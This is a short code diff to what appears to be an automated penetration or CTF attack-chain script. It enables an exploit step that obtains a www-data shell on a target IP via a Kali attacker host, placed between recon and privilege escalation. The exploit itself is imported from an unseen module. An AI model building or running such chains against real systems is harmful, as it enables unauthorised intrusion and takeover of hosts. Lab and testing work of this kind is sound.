@@ -69,6 +69,18 @@ def _step_recon(ctx: Context) -> dict[str, Any]:
     return {"recon_results": ctx.results_dir}
 
 
+def _step_exploit(ctx: Context) -> dict[str, Any]:
+    from initial_access import get_www_shell
+
+    www_shell = get_www_shell(
+        target_ip=ctx.target,
+        kali_ip=ctx.kali_host,
+    )
+    if www_shell is None:
+        raise RuntimeError("exploit returned no www-data shell")
+    return {"www_shell": www_shell}
+
+
 def _step_privesc(ctx: Context) -> dict[str, Any]:
     from privesc import run as privesc_run
 
@@ -97,8 +109,11 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
 
 CHAIN: list[Step] = [
     Step("recon", _step_recon),
-    # Step("exploit", _step_exploit, requires=("recon_results",),
-    #      teardown=_teardown_close_socket("www_shell")),
+    Step(
+        "exploit",
+        _step_exploit,
+        teardown=_teardown_close_socket("www_shell"),
+    ),
     Step(
         "privesc",
         _step_privesc,
